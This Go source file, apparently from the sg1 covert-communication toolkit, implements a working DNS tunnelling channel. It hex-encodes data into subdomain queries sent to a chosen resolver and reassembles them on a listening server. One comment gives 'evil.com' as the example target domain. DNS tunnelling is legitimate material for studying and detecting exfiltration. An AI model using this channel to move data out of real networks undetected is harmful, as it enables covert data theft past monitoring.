/*
* Copyleft 2017, Simone Margaritelli <evilsocket at protonmail dot com>
* Redistribution and use in source and binary forms, with or without
* modification, are permitted provided that the following conditions are met:
*
*   * Redistributions of source code must retain the above copyright notice,
*     this list of conditions and the following disclaimer.
*   * Redistributions in binary form must reproduce the above copyright
*     notice, this list of conditions and the following disclaimer in the
*     documentation and/or other materials provided with the distribution.
*   * Neither the name of ARM Inject nor the names of its contributors may be used
*     to endorse or promote products derived from this software without
*     specific prior written permission.
*
* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
* ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
* LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
* CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
* INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
* CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
* ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
* POSSIBILITY OF SUCH DAMAGE.
 */
package channels

import (
	"encoding/hex"
	"fmt"
	"github.com/evilsocket/sg1/sg1"
	"github.com/miekg/dns"
	"net"
	"regexp"
	"strconv"
)

var (
	DNSChunkSize         = 16
	DNSHostAddressParser = regexp.MustCompile("^([^@]+)@([^:]+):([\\d]+)$")
	DNSAddressParser     = regexp.MustCompile("^([^:]+):([\\d]+)$")
	DNSQuestionParser    = regexp.MustCompile("^([a-fA-F0-9]+)\\.(.+)\\.$")
)

type DNSChannel struct {
	is_client bool
	domain    string
	address   string
	port      int
	seq       *sg1.PacketSequencer
	server    dns.Server
	client    *dns.Client
	stats     Stats
}

func NewDNSChannel() *DNSChannel {
	return &DNSChannel{
		is_client: true,
		domain:    "google.com",
		address:   "",
		port:      53,
		server:    dns.Server{Addr: ":53", Net: "udp"},
		client:    nil,
		seq:       sg1.NewPacketSequencer(),
	}
}

func (c *DNSChannel) Copy() interface{} {
	return NewDNSChannel()
}

func (c *DNSChannel) Name() string {
	return "dns"
}

func (c *DNSChannel) Description() string {
	return "As input, read data from incoming DNS requests (example server: dns:example.com@192.168.1.2:5353), as output write data as DNS requests (example client: dns:example.com@192.168.1.2:5353)."
}

func (c *DNSChannel) Register() error {
	return nil
}

func parseQuestion(r *dns.Msg) (chunk []byte, domain string, err error) {
	if len(r.Question) != 1 {
		return nil, "", fmt.Errorf("Unexpected number of questions.")
	}

	m := DNSQuestionParser.FindStringSubmatch(r.Question[0].Name)
	if len(m) != 3 {
		return nil, "", fmt.Errorf("Could not parse DNS query question.")
	}

	chunk_hex := m[1]
	domain = m[2]
	if chunk, err = hex.DecodeString(chunk_hex); err != nil {
		return nil, "", fmt.Errorf("Could not decode hex chunk.")
	}

	return chunk, domain, nil
}

func (c *DNSChannel) setupServer(args string) error {
	c.is_client = false

	if c.address != "" {
		c.server.Addr = fmt.Sprintf("%s:%d", c.address, c.port)
	}

	dns.HandleFunc(".", func(w dns.ResponseWriter, r *dns.Msg) {
		sg1.Debug("Got DNS message.\n")
		if chunk, domain, err := parseQuestion(r); err == nil {
			if c.domain == "" || c.domain == domain {
				if packet, err := sg1.DecodePacket(chunk); err == nil {
					sg1.Debug("Decoded packet of %d bytes.\n", packet.DataSize)

					c.stats.TotalRead += int(packet.DataSize)
					c.seq.Add(packet)

					m := new(dns.Msg)
					m.SetReply(r)
					w.WriteMsg(m)
				} else {
					sg1.Error("Error while decoding packet: %s\n", err)
				}
			} else {
				sg1.Debug("Domain did not match '%s': %s.\n", c.domain, domain)
			}
		} else {
			sg1.Warning("Error while parsing DNS message: %s\n", err)
		}
	})

	return nil
}

func (c *DNSChannel) setupClient(args string) error {
	c.is_client = true
	if c.address != "" {
		c.client = new(dns.Client)
	} else {
		c.client = nil
	}

	return nil
}

func (c *DNSChannel) Setup(direction Direction, args string) (err error) {
	if m := DNSHostAddressParser.FindStringSubmatch(args); len(m) > 0 {
		// dns:evil.com@8.8.8.8:53
		c.domain = m[1]
		c.address = m[2]
		if c.port, err = strconv.Atoi(m[3]); err != nil {
			return err
		}
	} else if m := DNSAddressParser.FindStringSubmatch(args); len(m) > 0 {
		// dns:8.8.8.8:53 <- use default domain
		c.address = m[1]
		if c.port, err = strconv.Atoi(m[2]); err != nil {
			return err
		}
	}

	sg1.Debug("Setup DNS channel from args '%s': direction=%d domain='%s' resolver='%s' port=%d\n", args, direction, c.domain, c.address, c.port)

	if direction == INPUT_CHANNEL {
		return c.setupServer(args)
	} else {
		return c.setupClient(args)
	}
}

func (c *DNSChannel) Start() error {
	if c.is_client == true {
		sg1.Log("Performing DNS lookups ...\n")
	} else {
		sg1.Log("Running DNS server on '%s:%d' ...\n", c.address, c.port)

		go func() {
			if err := c.server.ListenAndServe(); err != nil {
				panic(err)
			}
		}()
	}

	return nil
}

func (c *DNSChannel) HasReader() bool {
	if c.is_client == false {
		return true
	} else {
		return false
	}
}

func (c *DNSChannel) HasWriter() bool {
	if c.is_client == false {
		return false
	} else {
		return true
	}
}

func (c *DNSChannel) Read(b []byte) (n int, err error) {
	if c.is_client {
		return 0, fmt.Errorf("dns client can't be used for reading.")
	}

	packet := c.seq.Get()
	data := packet.Data
	for i, c := range data {
		b[i] = c
	}

	sg1.Debug("Read %d bytes from DNS listener.\n", len(data))

	return len(data), nil
}

func (c *DNSChannel) Lookup(fqdn string) error {
	if c.client == nil {
		sg1.Debug("Resolving %s ...\n", fqdn)

		if _, err := net.LookupHost(fqdn); err != nil {
			return err
		}

	} else {
		sg1.Debug("Sending DNS question for %s to resolver %s:%d.\n", fqdn, c.address, c.port)

		m1 := new(dns.Msg)
		m1.Id = dns.Id()
		m1.RecursionDesired = true
		m1.Question = make([]dns.Question, 1)
		m1.Question[0] = dns.Question{fqdn + ".", dns.TypeA, dns.ClassINET}

		if _, _, err := c.client.Exchange(m1, fmt.Sprintf("%s:%d", c.address, c.port)); err != nil {
			return err
		}
	}

	return nil
}

func (c *DNSChannel) Write(b []byte) (n int, err error) {
	if c.is_client == false {
		return 0, fmt.Errorf("dns server can't be used for writing.")
	}

	sg1.Debug("Sending %d bytes in chunks of %d bytes...\n", len(b), DNSChunkSize)

	wrote := 0
	for _, chunk := range sg1.BufferToChunks(b, DNSChunkSize) {
		size := len(chunk)
		packet := c.seq.Packet(chunk)
		fqdn := fmt.Sprintf("%s.%s", packet.Hex(), c.domain)

		if err := c.Lookup(fqdn); err != nil {
			sg1.Error("Error while performing DNS lookup: %s\n", err)
		} else {
			sg1.Debug("Wrote %d bytes to DNS client.\n", size)
			wrote += size
			c.stats.TotalWrote += size
		}
	}

	return wrote, nil
}

func (c *DNSChannel) Stats() Stats {
	return c.stats
}
